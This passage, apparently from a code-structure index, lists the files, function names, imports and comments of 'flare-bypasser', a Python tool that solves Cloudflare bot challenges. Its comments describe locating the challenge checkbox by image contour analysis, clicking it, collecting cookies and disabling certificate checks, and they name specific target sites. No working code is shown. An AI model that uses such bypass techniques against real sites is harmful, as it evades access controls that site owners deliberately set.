        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/utils/linux_chrome_archive_installer.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_package(download_url):",
          "def unzip_package(",
          "def download_and_install(version_prefix = None, install_root = None, arch = 'x86_64'):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import json",
          "import zipfile",
          "import argparse",
          "from urllib.request import urlretrieve, urlopen"
        ],
        "comments": [
          "# Script can install chrome only on linux platforms and only on x86_64.",
          "# here no archive of versions for linux/arm64",
          "# If version is undefined: use max_version"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/tests/unit_tests/proxy_controller_test.py",
        "docstrings": [],
        "function_defs": [
          "def test_two_different_proxies_rent():",
          "def test_two_equal_proxies_rent():"
        ],
        "class_defs": [],
        "imports": [
          "from flare_bypasser import ProxyController"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import importlib.metadata",
          "from .flare_bypasser import Request, Response, Solver, BrowserWrapper, BaseCommandProcessor",
          "from .proxy_controller import ProxyController",
          "from .flare_bypass_server import server, server_run",
          "from .async_client import AsyncClient"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/async_client.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, solver_url):",
          "def http_client(self) -> httpx.AsyncClient:"
        ],
        "class_defs": [
          "class AsyncClient(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import typing",
          "import copy",
          "import json",
          "import re",
          "import httpx"
        ],
        "comments": [
          "# < base user-agent that will be used before first challenge solve,",
          "# after it will be replaced with solver actual user-agent",
          "# request web page",
          "# check that it is cloud flare block",
          "# Return site original 403(non cloud flare blocking) as is - application should process it.",
          "# c is http.cookiejar.Cookie",
          "# < use for solve original client cookies,",
          "# it can contains some required information other that cloud flare marker.",
          "# Update _http_client cookies"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": [
          "@property"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/browser_wrapper.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, center):",
          "def __init__(self, page: zendriver.Tab, center_coords):",
          "def _make_attrs(self):  # override for exclude exception on __init__",
          "def __init__(",
          "def __del__(self):",
          "def start_xvfb_display():",
          "def get_driver(self) -> zendriver.Tab:",
          "def _parse_call(task):"
        ],
        "class_defs": [
          "class BrowserWrapper(object):",
          "class FakePosition(object):",
          "class FakeNode(object):",
          "class FakeElement(zendriver.Element):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import typing",
          "import asyncio",
          "import uuid",
          "import shutil",
          "import logging",
          "import time",
          "import cv2",
          "import zendriver_flare_bypasser as zendriver",
          "from xvfbwrapper import Xvfb"
        ],
        "comments": [
          "# < zendriver expect here only json serializable types",
          "# Attributes for working __repr__:",
          "# overrides for call only cdp click send in zendriver.Element.mouse_click",
          "# Disable certificates checking",
          "# Get original driver page impl - can be used only in user command specific implementations",
          "# return (title, loaded flag)",
          "# DOM tree changed in runtime",
          "# < zendriver timeout on element waiting",
          "# external timeout: page isn't loaded",
          "# < Select without waiting.",
          "# DOM tree changed in runtime",
          "# we work only with one page - close all tabs (excluding first - this close browser)",
          "# Specific workaround for zendriver",
          "# click by coordinates without no driver patching.",
          "# convert {\"name\": \"...\", \"value\": \"...\", ...} to array of http.cookiejar.Cookie",
          "# < self._zendriver_driver.cookies.set_all(set_cookies)",
          "# return list of dict have format: {\"name\": \"...\", \"value\": \"...\"}",
          "# < self._zendriver_driver.cookies.get_all(requests_cookie_format=True)",
          "# convert array of http.cookiejar.Cookie to expected cookie format",
          "# Wrap call that allow to repeat driver call after timeout_step",
          "# Used as workaround for case when chrome don't response on CDP request",
          "# Can be disabled by enable_lost_cdp_workaround flag",
          "# for understand why we pass lambda to _deffered_call, see _deffered_call description",
          "# handle exceptions like: TypeError: target must be set to a 'TargetInfo' but got 'NoneType",
          "# it can appears in zendriver.connection.update_target on all operations,",
          "# (as result of runtime DOM changes or on page loading)",
          "# task is function, that will return coro, this allow to",
          "# avoid \"coroutine ... was never awaited\" warning",
          "# (we create coro only before it await)",
          "# wait first task canceled for get stack in exception"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 22,
        "decorators": [
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/example_command_processor.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ExampleCommandProcessor(flare_bypasser.BaseCommandProcessor):"
        ],
        "imports": [
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/flare_bypass_server.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, app):",
          "def parse_class_command_processors(custom_command_processors_str: str):",
          "def parse_entrypoint_command_processors(extension: str):",
          "def parse_solve_forks(solve_forks: str):",
          "def init_args_parser():",
          "def init_extensions(args):",
          "def server_run():"
        ],
        "class_defs": [
          "class RemoveContentTypeRequirementMiddleware(object):",
          "class ProxyModel(pydantic.BaseModel):",
          "class CookieModel(pydantic.BaseModel):",
          "class DefferedForksModel(pydantic.BaseModel):",
          "class HandleCommandResponseSolution(pydantic.BaseModel):",
          "class HandleCommandResponse(pydantic.BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import re",
          "import typing",
          "import typing_extensions",
          "import datetime",
          "import copy",
          "import platform",
          "import uuid",
          "import pathlib",
          "import asyncio",
          "import traceback",
          "import importlib",
          "import logging",
          "import argparse",
          "import urllib3.util",
          "import fastapi",
          "import pydantic",
          "import flare_bypasser",
          "import gunicorn.app.wsgiapp",
          "import uvicorn.main"
        ],
        "comments": [
          "# Remove requirement for Content-Type header presence.",
          "# Unexpected headers format - don't make something.",
          "# Adapt proxy format for canonical representation.",
          "# < solve_response can't be None if no return_condition passed to wait_first_non_exception,",
          "# only exception expected",
          "# < pass cookies as dict's (solver don't know about rest model).",
          "# Endpoint compatible with flaresolverr API.",
          "# REST API concept methods.",
          "# postDataContentType: typing_extensions.Annotated[",
          "#   str,",
          "#   fastapi.Body(description=\"Content-Type that will be sent.\")",
          "#   ]='',",
          "# 'postDataContentType': postDataContentType,",
          "# < parse for pass to gunicorn as is and as \"--host X --port X\" to uvicorn",
          "# FLARE_BYPASS_COMMANDPROCESSORS format: <command>:<module>.<class>",
          "# class should have default constructor (without parameters)",
          "# Expect that extension element has format: <module>.<method>",
          "# Init ProxyController"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 22,
        "decorators": [
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post("
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/flare_bypasser.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, _dict=None):",
          "def __str__(self):",
          "def __init__(self, _dict):",
          "def __str__(self):",
          "def __init__(self, message: str, step: str = None):",
          "def __init__(",
          "def title_is_denied_title(page_title):",
          "def _get_dominant_color(image):",
          "def _get_flare_rect_contours(image, save_steps_dir: str = None):",
          "def get_flare_click_point(image, logger = None, save_steps_dir: str = None, log_prefix = ''):"
        ],
        "class_defs": [
          "class Request(object):",
          "class Response:",
          "class BaseCommandProcessor(object):",
          "class GetCookiesCommandProcessor(BaseCommandProcessor):",
          "class GetPageCommandProcessor(BaseCommandProcessor):",
          "class PostCommandProcessor(BaseCommandProcessor):",
          "class Solver(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import abc",
          "import sys",
          "import logging",
          "import os",
          "import typing",
          "import copy",
          "import random",
          "import datetime",
          "import asyncio",
          "import certifi",
          "import contextlib",
          "import html",
          "import urllib",
          "import numpy as np",
          "import cv2",
          "from .browser_wrapper import BrowserWrapper",
          "from .proxy_controller import ProxyController"
        ],
        "comments": [
          "# Image processing imports",
          "# Cloudflare",
          "# Cloudflare",
          "# Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands",
          "# Fairlane / pararius.com",
          "# preprocess url before solve (for example: can replace url with page content for POST request processing)",
          "# prepare page with form for emulate POST.",
          "# init standard commands",
          "# do some validations",
          "# Read outputs only after driver close (when process stopped),",
          "# otherwise output reading can be blocked.",
          "# Reask title (page loading can be finished between title getting and html checking)",
          "# find access denied titles",
          "# find access denied selectors",
          "# find challenge by title",
          "# find challenge by selectors",
          "# check that challenge present (wait when it will disappear after click)",
          "# check that need to click,",
          "# get screenshot of full page (all elements is in shadowroot)",
          "# clicking can be required few times.",
          "# recheck that challenge present - we can be already redirected and",
          "# need to exclude click on result page",
          "# < preprocess_command can say, that page opening isn't required (it opened it already).",
          "# navigate to the page",
          "# set cookies if required",
          "# find challenge by title",
          "# After solve, don't execute js ! Only extension can (it know page properties),",
          "# some pages can have problems with js evaluation (blocked js loop, ...)",
          "# Ask required page traits in parallel",
          "# We use separate driver instance for fill user-agent !",
          "# For fill user-agent we need to execute js,",
          "# requested page can have bad implementation and can blocks js execution (inf loop, ...)",
          "# Create instance without proxy",
          "# start_cpu_time = time.process_time()",
          "# Step, that can be runned once",
          "# Common steps",
          "# Dilate little omissions in contours (lost by color range or by image quality).",
          "# Dilate for increase contours detection precision.",
          "# end_cpu_time = time.process_time()",
          "# end_cpu_time = time.process_time()",
          "# ignore small rectangles",
          "# ignore very big rectangles",
          "# calculate area difference",
          "# eval iou with (with undestanding that contour_area inside rect_area)",
          "# get minimal contour (usualy we have here 3 contours",
          "# pack low distance contours (one rect can be present as 2 contours: inner, outer)",
          "# remove buggest contour",
          "# rect contours sorted by area ascending",
          "# Now we should find two rect contours (one inside other) with ratio 1-5%, (now I see: 0.0213).",
          "# Check area ratio and that area1 inside area2.",
          "# Checkbox found.",
          "# fix ssl certificates for compiled binaries",
          "# https://github.com/pyinstaller/pyinstaller/issues/7229",
          "# https://stackoverflow.com/questions/55736855/how-to-change-the-cafile-argument-in-the-ssl-module-in-python3"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 27,
        "decorators": [
          "@abc.abstractmethod",
          "@abc.abstractmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/src/flare_bypasser/proxy_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, proxy_storage: object, local_port: int, url: str):",
          "def add_ref(self):",
          "def remove_ref(self):",
          "def __init__(self, proxy_holder: object):",
          "def local_port(self):",
          "def url(self):",
          "def is_alive(self):",
          "def release(self):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def __del__(self):",
          "def __init__(",
          "def get_proxy(self, url):",
          "def opened_proxies_count(self):",
          "def _port_is_listen(port):",
          "def _choose_port(self, url):",
          "def _start_proxy(self, proxy_holder):",
          "def _close_proxy(self, proxy_holder):"
        ],
        "class_defs": [
          "class ProxyController(object):",
          "class PortBusy(Exception):",
          "class NoPortForListen(Exception):",
          "class ProxyHolder(object):",
          "class ProxyHolderRef(object):"
        ],
        "imports": [
          "import typing",
          "import threading",
          "import subprocess",
          "import socket",
          "import logging",
          "import contextlib",
          "import oslex",
          "import jinja2"
        ],
        "comments": [
          "# [start_port .. end_port]: localy started proxies will use ports in this interval",
          "# wait start if it in progress",
          "# < Start/wait start or simple increase ref.",
          "# Start proxy process",
          "# Close proxy process"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/examples/async_client/async_client_example.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import argparse",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare-bypasser-0.1.52/examples/custom_user_commands/CustomUserCommands.py",
        "docstrings": [],
        "function_defs": [
          "def get_user_commands():"
        ],
        "class_defs": [
          "class MyClickCommandProcessor(BaseCommandProcessor):"
        ],
        "imports": [
          "import zendriver_flare_bypasser as zendriver",
          "from flare_bypasser import BaseCommandProcessor, Request, Response, BrowserWrapper"
        ],
        "comments": [
          "# Here we can check some required parameters in req.params and raise error.",
          "# Expect here \"Bledny kod\" text in DOM (appears only after click)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser",
    "name": "flare_bypasser",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from .flare_bypass_server import *"
        ],
        "comments": [
          "# We can't get package version metadata inside Docker since package is not installed."
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/setup.py",
        "docstrings": [],
        "function_defs": [
          "def is_installed(pkgname):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import importlib",
          "import distutils.core"
        ],
        "comments": [
          "# Trick for avoid installation of non pip installed packages (apt), available by ADDITIONAL_PYTHONPATH",
          "# 'websockets @ git+https://github.com/yoori/websockets.git@main',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@debug3',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@flare-bypasser',",
          "# Server dependecies"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/utils/checkbox_recognizer.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import logging",
          "import argparse",
          "import cv2",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/utils/linux_chrome_archive_installer.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_package(download_url):",
          "def unzip_package(",
          "def download_and_install(version_prefix = None, install_root = None, arch = 'x86_64'):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import json",
          "import zipfile",
          "import argparse",
          "from urllib.request import urlretrieve, urlopen"
        ],
        "comments": [
          "# Script can install chrome only on linux platforms and only on x86_64.",
          "# here no archive of versions for linux/arm64",
          "# If version is undefined: use max_version"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/tests/unit_tests/proxy_controller_test.py",
        "docstrings": [],
        "function_defs": [
          "def test_two_different_proxies_rent():",
          "def test_two_equal_proxies_rent():"
        ],
        "class_defs": [],
        "imports": [
          "from flare_bypasser import ProxyController"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import importlib.metadata",
          "from .flare_bypasser import Request, Response, Solver, BrowserWrapper, BaseCommandProcessor",
          "from .proxy_controller import ProxyController",
          "from .flare_bypass_server import server, server_run",
          "from .async_client import AsyncClient"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/async_client.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, solver_url):",
          "def http_client(self) -> httpx.AsyncClient:"
        ],
        "class_defs": [
          "class AsyncClient(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import typing",
          "import copy",
          "import json",
          "import re",
          "import httpx"
        ],
        "comments": [
          "# < base user-agent that will be used before first challenge solve,",
          "# after it will be replaced with solver actual user-agent",
          "# request web page",
          "# check that it is cloud flare block",
          "# Return site original 403(non cloud flare blocking) as is - application should process it.",
          "# c is http.cookiejar.Cookie",
          "# < use for solve original client cookies,",
          "# it can contains some required information other that cloud flare marker.",
          "# Update _http_client cookies"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": [
          "@property"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/browser_wrapper.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, center):",
          "def __init__(self, page: zendriver.Tab, center_coords):",
          "def _make_attrs(self):  # override for exclude exception on __init__",
          "def __init__(",
          "def __del__(self):",
          "def start_xvfb_display():",
          "def get_driver(self) -> zendriver.Tab:",
          "def _parse_call(task):"
        ],
        "class_defs": [
          "class BrowserWrapper(object):",
          "class FakePosition(object):",
          "class FakeNode(object):",
          "class FakeElement(zendriver.Element):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import typing",
          "import asyncio",
          "import uuid",
          "import shutil",
          "import logging",
          "import time",
          "import cv2",
          "import zendriver_flare_bypasser as zendriver",
          "from xvfbwrapper import Xvfb"
        ],
        "comments": [
          "# < zendriver expect here only json serializable types",
          "# Attributes for working __repr__:",
          "# overrides for call only cdp click send in zendriver.Element.mouse_click",
          "# Disable certificates checking",
          "# Get original driver page impl - can be used only in user command specific implementations",
          "# return (title, loaded flag)",
          "# DOM tree changed in runtime",
          "# < zendriver timeout on element waiting",
          "# external timeout: page isn't loaded",
          "# < Select without waiting.",
          "# DOM tree changed in runtime",
          "# we work only with one page - close all tabs (excluding first - this close browser)",
          "# Specific workaround for zendriver",
          "# click by coordinates without no driver patching.",
          "# convert {\"name\": \"...\", \"value\": \"...\", ...} to array of http.cookiejar.Cookie",
          "# < self._zendriver_driver.cookies.set_all(set_cookies)",
          "# return list of dict have format: {\"name\": \"...\", \"value\": \"...\"}",
          "# < self._zendriver_driver.cookies.get_all(requests_cookie_format=True)",
          "# convert array of http.cookiejar.Cookie to expected cookie format",
          "# Wrap call that allow to repeat driver call after timeout_step",
          "# Used as workaround for case when chrome don't response on CDP request",
          "# Can be disabled by enable_lost_cdp_workaround flag",
          "# for understand why we pass lambda to _deffered_call, see _deffered_call description",
          "# handle exceptions like: TypeError: target must be set to a 'TargetInfo' but got 'NoneType",
          "# it can appears in zendriver.connection.update_target on all operations,",
          "# (as result of runtime DOM changes or on page loading)",
          "# task is function, that will return coro, this allow to",
          "# avoid \"coroutine ... was never awaited\" warning",
          "# (we create coro only before it await)",
          "# wait first task canceled for get stack in exception"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 22,
        "decorators": [
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/example_command_processor.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ExampleCommandProcessor(flare_bypasser.BaseCommandProcessor):"
        ],
        "imports": [
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/flare_bypass_server.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, app):",
          "def parse_class_command_processors(custom_command_processors_str: str):",
          "def parse_entrypoint_command_processors(extension: str):",
          "def parse_solve_forks(solve_forks: str):",
          "def init_args_parser():",
          "def init_extensions(args):",
          "def server_run():"
        ],
        "class_defs": [
          "class RemoveContentTypeRequirementMiddleware(object):",
          "class ProxyModel(pydantic.BaseModel):",
          "class CookieModel(pydantic.BaseModel):",
          "class DefferedForksModel(pydantic.BaseModel):",
          "class HandleCommandResponseSolution(pydantic.BaseModel):",
          "class HandleCommandResponse(pydantic.BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import re",
          "import typing",
          "import typing_extensions",
          "import datetime",
          "import copy",
          "import platform",
          "import uuid",
          "import pathlib",
          "import asyncio",
          "import traceback",
          "import importlib",
          "import logging",
          "import argparse",
          "import urllib3.util",
          "import fastapi",
          "import pydantic",
          "import flare_bypasser",
          "import gunicorn.app.wsgiapp",
          "import uvicorn.main"
        ],
        "comments": [
          "# Remove requirement for Content-Type header presence.",
          "# Unexpected headers format - don't make something.",
          "# Adapt proxy format for canonical representation.",
          "# < solve_response can't be None if no return_condition passed to wait_first_non_exception,",
          "# only exception expected",
          "# < pass cookies as dict's (solver don't know about rest model).",
          "# Endpoint compatible with flaresolverr API.",
          "# REST API concept methods.",
          "# postDataContentType: typing_extensions.Annotated[",
          "#   str,",
          "#   fastapi.Body(description=\"Content-Type that will be sent.\")",
          "#   ]='',",
          "# 'postDataContentType': postDataContentType,",
          "# < parse for pass to gunicorn as is and as \"--host X --port X\" to uvicorn",
          "# FLARE_BYPASS_COMMANDPROCESSORS format: <command>:<module>.<class>",
          "# class should have default constructor (without parameters)",
          "# Expect that extension element has format: <module>.<method>",
          "# Init ProxyController"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 2,
        "error_handling": 22,
        "decorators": [
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post(",
          "@server.post("
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/flare_bypasser.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, _dict=None):",
          "def __str__(self):",
          "def __init__(self, _dict):",
          "def __str__(self):",
          "def __init__(self, message: str, step: str = None):",
          "def __init__(",
          "def title_is_denied_title(page_title):",
          "def _get_dominant_color(image):",
          "def _get_flare_rect_contours(image, save_steps_dir: str = None):",
          "def get_flare_click_point(image, logger = None, save_steps_dir: str = None, log_prefix = ''):"
        ],
        "class_defs": [
          "class Request(object):",
          "class Response:",
          "class BaseCommandProcessor(object):",
          "class GetCookiesCommandProcessor(BaseCommandProcessor):",
          "class GetPageCommandProcessor(BaseCommandProcessor):",
          "class PostCommandProcessor(BaseCommandProcessor):",
          "class Solver(object):",
          "class Exception(Exception):"
        ],
        "imports": [
          "import abc",
          "import sys",
          "import logging",
          "import os",
          "import typing",
          "import copy",
          "import random",
          "import datetime",
          "import asyncio",
          "import certifi",
          "import contextlib",
          "import html",
          "import urllib",
          "import numpy as np",
          "import cv2",
          "from .browser_wrapper import BrowserWrapper",
          "from .proxy_controller import ProxyController"
        ],
        "comments": [
          "# Image processing imports",
          "# Cloudflare",
          "# Cloudflare",
          "# Custom CloudFlare for EbookParadijs, Film-Paleis, MuziekFabriek and Puur-Hollands",
          "# Fairlane / pararius.com",
          "# preprocess url before solve (for example: can replace url with page content for POST request processing)",
          "# prepare page with form for emulate POST.",
          "# init standard commands",
          "# do some validations",
          "# Read outputs only after driver close (when process stopped),",
          "# otherwise output reading can be blocked.",
          "# Reask title (page loading can be finished between title getting and html checking)",
          "# find access denied titles",
          "# find access denied selectors",
          "# find challenge by title",
          "# find challenge by selectors",
          "# check that challenge present (wait when it will disappear after click)",
          "# check that need to click,",
          "# get screenshot of full page (all elements is in shadowroot)",
          "# clicking can be required few times.",
          "# recheck that challenge present - we can be already redirected and",
          "# need to exclude click on result page",
          "# < preprocess_command can say, that page opening isn't required (it opened it already).",
          "# navigate to the page",
          "# set cookies if required",
          "# find challenge by title",
          "# After solve, don't execute js ! Only extension can (it know page properties),",
          "# some pages can have problems with js evaluation (blocked js loop, ...)",
          "# Ask required page traits in parallel",
          "# We use separate driver instance for fill user-agent !",
          "# For fill user-agent we need to execute js,",
          "# requested page can have bad implementation and can blocks js execution (inf loop, ...)",
          "# Create instance without proxy",
          "# start_cpu_time = time.process_time()",
          "# Step, that can be runned once",
          "# Common steps",
          "# Dilate little omissions in contours (lost by color range or by image quality).",
          "# Dilate for increase contours detection precision.",
          "# end_cpu_time = time.process_time()",
          "# end_cpu_time = time.process_time()",
          "# ignore small rectangles",
          "# ignore very big rectangles",
          "# calculate area difference",
          "# eval iou with (with undestanding that contour_area inside rect_area)",
          "# get minimal contour (usualy we have here 3 contours",
          "# pack low distance contours (one rect can be present as 2 contours: inner, outer)",
          "# remove buggest contour",
          "# rect contours sorted by area ascending",
          "# Now we should find two rect contours (one inside other) with ratio 1-5%, (now I see: 0.0213).",
          "# Check area ratio and that area1 inside area2.",
          "# Checkbox found.",
          "# fix ssl certificates for compiled binaries",
          "# https://github.com/pyinstaller/pyinstaller/issues/7229",
          "# https://stackoverflow.com/questions/55736855/how-to-change-the-cafile-argument-in-the-ssl-module-in-python3"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 27,
        "decorators": [
          "@abc.abstractmethod",
          "@abc.abstractmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/src/flare_bypasser/proxy_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, proxy_storage: object, local_port: int, url: str):",
          "def add_ref(self):",
          "def remove_ref(self):",
          "def __init__(self, proxy_holder: object):",
          "def local_port(self):",
          "def url(self):",
          "def is_alive(self):",
          "def release(self):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def __del__(self):",
          "def __init__(",
          "def get_proxy(self, url):",
          "def opened_proxies_count(self):",
          "def _port_is_listen(port):",
          "def _choose_port(self, url):",
          "def _start_proxy(self, proxy_holder):",
          "def _close_proxy(self, proxy_holder):"
        ],
        "class_defs": [
          "class ProxyController(object):",
          "class PortBusy(Exception):",
          "class NoPortForListen(Exception):",
          "class ProxyHolder(object):",
          "class ProxyHolderRef(object):"
        ],
        "imports": [
          "import typing",
          "import threading",
          "import subprocess",
          "import socket",
          "import logging",
          "import contextlib",
          "import oslex",
          "import jinja2"
        ],
        "comments": [
          "# [start_port .. end_port]: localy started proxies will use ports in this interval",
          "# wait start if it in progress",
          "# < Start/wait start or simple increase ref.",
          "# Start proxy process",
          "# Close proxy process"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/examples/async_client/async_client_example.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import asyncio",
          "import argparse",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/media-automation/flare-bypasser-arm/flare_bypasser/examples/custom_user_commands/CustomUserCommands.py",
        "docstrings": [],
        "function_defs": [
          "def get_user_commands():"
        ],
        "class_defs": [
          "class MyClickCommandProcessor(BaseCommandProcessor):"
        ],
        "imports": [
          "import zendriver_flare_bypasser as zendriver",
          "from flare_bypasser import BaseCommandProcessor, Request, Response, BrowserWrapper"
        ],
        "comments": [
          "# Here we can check some required parameters in req.params and raise error.",
          "# Expect here \"Bledny kod\" text in DOM (appears only after click)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
